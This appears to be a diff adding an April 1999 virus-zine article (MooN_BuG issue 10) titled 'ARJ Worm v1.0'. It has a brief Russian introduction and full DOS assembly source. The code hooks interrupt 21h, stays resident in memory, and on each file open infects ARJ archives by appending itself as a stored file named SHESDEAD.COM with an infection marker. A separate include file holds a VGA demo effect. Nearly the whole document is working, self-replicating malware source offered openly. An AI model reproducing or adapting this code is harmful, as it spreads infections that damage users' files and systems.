@@ -1,0 +1,427 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 10, Apr 1999                                          file 00C
+
+                                ARJ Worm v1.0
+                                             by B!Z0n
+
+     Доволно халтypная, но, как гpится "с пивом потянет", демка-чеpвь(виpyс?).
+Особо  я  ее  не  yсложнял  и  от  антивиpей  не защищал. Довольно оpигинально
+pаботает... ;) Поpажает ARJ аpхивы, внедpяя в них свое тело.
+
+=== Cut ===                                                       arj_worm.asm
+; ARJ Worm v1.0
+; (c) by B!Z0n //[BzZ]
+; dedicated to my perished sister... :~(
+;
+model tiny
+codeseg
+startupcode
+p286
+
+CR      equ     0Dh,0Ah
+wormsz   =      end_worm-start_worm
+
+start_worm:
+;-------------------------------------------------
+include demo.inc
+;-------------------------------------------------
+        mov     ax, 01992h
+        int     21h
+        cmp     ax, 02906h
+        je     exit
+        mov     ax, 3521h
+        int     21h
+        mov     word ptr [oldi21], bx
+        mov     word ptr [oldi21+2], es
+;--[debug]----------------------------------------
+;        mov     ax, 3d00h
+;        lea     dx, filename
+;        jmp     no_worm
+;filename        db  'test.arj',0
+;-------------------------------------------------
+        mov     ax, 2521h
+        lea     dx, tsr_worm
+        int     21h
+        lea     dx, finish ;end_worm
+        int     27h
+exit:
+        mov     ah, 4ch
+        int     21h
+
+tsr_worm:
+        pushf
+        cmp     ax, 01992h
+        jne     no_worm
+        mov     ax, 02906h
+        popf
+        iret
+no_worm:
+        cmp     ah, 3Dh         ; open file
+        jne     go_int21
+
+        pusha
+        push    ds es
+
+        mov     al, 02h           ; rw open
+
+        cli
+        pushf
+        call    dword ptr cs:[oldi21]  ; open file
+        sti
+
+        jc      no_arj
+        xchg    ax, bx
+
+        push    cs
+        push    cs
+        pop     ds
+        pop     es
+
+        call    fread
+        jc      fclose
+
+        cmp     word ptr [readbuf], 0EA60h    ; .ARJ file?
+        jne     no_arj
+
+        mov     ax, 4202h
+        call    lseek
+
+        sub     ax, 0006h
+        sbb     dx, 0000h
+        push    ax dx
+        pop     cx dx
+        mov     ax, 4200h
+        int     21h
+
+        call    fread
+        cmp     word ptr [readbuf+2], 0EA60h  ; .ARJ file?
+        jne     no_arj
+        cmp     word ptr [readbuf], 0ADDEh    ; infected?
+        je      fclose
+
+        call    infect_arj
+
+no_arj:
+fclose:
+        mov     ah, 3Eh
+        int     21h
+
+        pop     es ds
+        popa
+
+go_int21:
+        popf
+        db      0EAh
+oldi21  dd      ?
+;------------------------------------------------------------------------
+virname         db      000h, 'ARJ Worm v1.0',000h,'by'
+copyryght       db      000h, 'B!Z0n //[BzZ]'
+memo            db      000h, '(dedicate to my perished sister...)',000h
+;------------------------------------------------------------------------
+fread:
+        mov     ah, 3Fh
+        mov     cx, 0006h
+        lea     dx, readbuf
+        int     21h
+        ret
+lseek:
+        xor     cx, cx
+        cwd
+        int     21h
+        ret
+;-----------------------------
+infect_arj      proc    near
+
+
+        mov     ax,4202h
+        call    lseek
+
+        sub     ax,4
+        sbb     dx,0
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200h
+        int     21h
+
+        mov     word ptr csize,offset end_worm - offset start_worm
+        mov     word ptr osize,offset end_worm - offset start_worm
+
+        mov     cx, wormsz
+        mov     si, offset start_worm         ;start of program in memory
+        call    crc32
+
+        cld
+        mov     si, offset marker
+        mov     di, offset sparebuff
+        mov     cx, offset end_worm - offset marker
+        rep     movsb
+
+        mov     word ptr crc,ax
+        mov     word ptr crc+2,dx
+
+        mov     cx, word ptr bhsize
+        mov     si, offset fhsize
+        call    crc32
+        mov     word ptr acrc,ax
+        mov     word ptr acrc+2,dx
+
+        mov     ah, 40h
+        mov     cx, offset fdata - offset marker
+        mov     dx, offset marker
+        int     21h
+
+        mov     ah, 40h
+        mov     cx, offset marker - offset start_worm
+        mov     dx, offset start_worm
+        int     21h
+
+        mov     ah, 40h
+        mov     cx,offset end_worm - offset marker
+        mov     dx,offset sparebuff
+        int     21h
+
+        mov     ah, 40h
+        mov     cx,4
+        mov     dx,offset fdend
+        int     21h
+
+        ret
+
+infect_arj       endp
+
+crc32   proc    near
+;on entry cx=number of bytes to checksum
+;         si=pointer to bytes
+;on exit dx:ax contains the checksum
+;I stole this code from some PD sources I got off a BBS.
+
+        push    bx
+        push    cx
+        push    si
+        push    di
+
+        call    gentable
+
+        mov     dx,-1
+        mov     ax,-1
+
+crc32loop:
+        xor     bx,bx
+        mov     bl,byte ptr [si]
+        inc     si
+        xor     bl,al
+        shl     bx,1
+        shl     bx,1
+        mov     al,ah
+        mov     ah,dl
+        mov     dl,dh
+        xor     dh,dh
+        xor     ax,word ptr [bx+crc32tab]
+        xor     dx,word ptr [bx+crc32tab+2]
+
+        dec     cx
+        jnz     crc32loop
+        pop     di
+        pop     si
+        pop     cx
+        pop     bx
+
+        xor     dx,-1
+        xor     ax,-1
+
+        ret
+
+crc32   endp
+
+
+Gentable        proc    near
+;Generates the 32bit crc table.  Thanks to "Necrosoft Enterprises" who had
+;this code inside their Dementia Virus.  I have plenty of other code to do
+;this, but it is all much, much bigger.
+
+        push    ax
+        push    cx
+        push    dx
+        push    di
+
+        mov     di,offset crc32tab
+        xor     cx,cx
+
+outgen:
+        xor     dx,dx
+        xor     ax,ax
+        mov     al,cl
+        push    cx
+        mov     cx,8
+calcloop:
+        clc
+        rcr     dx,1
+        rcr     ax,1
+        jnc     nocrcxor
+        xor     dx,0edb8h
+        xor     ax,8320h
+nocrcxor:
+        loop    calcloop
+        mov     word ptr [di],ax
+        mov     word ptr [di+2],dx
+        add     di,4
+        pop     cx
+        inc     cx
+        cmp     cx,100h
+        jne     outgen
+        pop     di
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+Gentable        endp
+
+
+rbuff:
+
+marker  db      60h,0eah
+bhsize  dw      offset acrc - offset fhsize
+fhsize  db      offset aname - offset fhsize
+anum    db      6
+anum2   db      1
+osver   db      0
+aflag   db      0
+ameth   db      0                               ;stored
+aftype  db      0                               ;binary
+ares    db      0
+dtm     dd      18dd0bc0h                       ;06/29/92 01:30:00 black day
+                                                ;for me ;-(
+csize   dd      4                               ;compressed size
+osize   dd      4                               ;original size
+crc     dd      0
+fspec   dw      0
+faccess dw      0
+hstdata dw      0
+aname   db      "SHESDEAD.COM",0,0
+acomm   db      0
+acrc    dd      0
+ehsize  dw      0
+
+fdata   db      "!"
+fdend:
+db      60h,0eah,0,0
+
+                db      0DEh,0ADh
+end_worm:
+
+sparebuff       db      offset end_worm - offset marker DUP (?)
+readbuf         db      6 DUP (?)
+crc32tab        db      100h*4 dup (?)
+
+finish:
+;-----------------------------
+        end
+=== Cut ===
+
+=== Cut ===                                                           demo.inc
+p386
+;----------------------------------------------------------
+Demo:    ; START OF DEMO
+;----------------------------------------------------------
+        mov     ax,0013h
+        int     10h
+        mov     bx, offset end_worm
+        mov     si,0381h + 200h
+        mov     di,05BFh + 200h
+        xor     eax,eax
+        stosd
+        mov     eax,00064855h
+        stosd
+        mov     ebp,00FFEC42h
+        mov     cx,013Eh
+xloop_24:
+        imul    ebp
+        shrd    eax,edx,17h
+        sub     eax,dword ptr [di-08h]
+        stosd
+        mov     edx,eax
+chgs:   sar     edx,10h
+        mov     byte ptr [bx],dl
+        sar     dx,1
+        mov     byte ptr [si],dl
+        inc     bx
+        inc     si
+        loop    xloop_24
+        xor     ax,ax
+        xor     bx,bx
+        mov     dx,03C8h
+        out     dx,al
+        inc     dx
+        mov     cl,80h
+        mov     di,0ABFh + 200h
+        push    di
+xloop_52:
+        mov     al,bl
+        shr     al,1
+        push    ax
+        stosb
+        shr     al,1
+        stosb
+        pop     ax
+        stosb
+        inc     bx
+        loop    xloop_52
+        mov     cl,80h
+        mov     si,di
+        dec     si
+xloop_65:
+        std
+        lodsb
+        cld
+        stosb
+        dec     si
+        std
+        lodsw
+        inc     si
+        cld
+        ror     ax,08h
+        stosw
+        loop    xloop_65
+        pop     si
+        mov     ch,03h
+        repe    outsb
+xloop_79:
+        push    0A000h
+        pop     es
+        xor     di,di
+        xor     ax,ax
+        mov     si,03BFh     + 200h
+        mov     cx,00C8h
+xloop_87:
+        mov     dx,0140h
+xloop_8A:
+        mov     bl,dl
+        mov     al,byte ptr [bx+si]
+        mov     bl,cl
+        add     al,byte ptr [bx+end_worm]
+xlab1:  add     al,03h
+        mov     bl,al
+        mov     al,byte ptr [bx+si]
+        add     al,dl
+        add     al,dl
+        stosb
+        dec     dx
+        jnz     xloop_8A
+        loop    xloop_87
+        add     byte ptr cs:[xlab1+1],04h
+        mov     dx,03DAh
+xloop_AC:
+        in      al,dx
+        and     al,08h
+        jz      xloop_AC
+        mov     ah,01h
+        int     16h
+        jz      xloop_79
+        xor     ah, ah
+        int     16h
+        mov     ax,0003h
+        int     10h
+;----------------------------------------------------------
+;       END OF DEMO
+;----------------------------------------------------------
+=== Cut ===
